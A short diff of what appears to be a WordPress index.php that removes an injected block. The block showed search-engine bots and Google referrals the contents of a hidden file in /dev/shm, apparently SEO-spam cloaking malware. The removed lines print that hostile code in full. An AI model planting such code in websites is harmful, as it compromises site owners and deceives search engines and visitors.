@@ -1,14 +1,4 @@
 <?php
-$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
-$referer = strtolower($_SERVER['HTTP_REFERER'] ?? '');
-$uri = $_SERVER['REQUEST_URI'] ?? '';
-
-if ($uri == '/' && (strpos($userAgent, 'bot') !== false || strpos($userAgent, 'google') !== false  || strpos($userAgent, 'chrome-lighthouse') !== false || strpos($referer, 'google') !== false)) {
-    echo file_get_contents('/dev/shm/99.txt');
-    exit();
-}
-?>
-<?php
 /**
  * Loads the WordPress environment and template.
  *
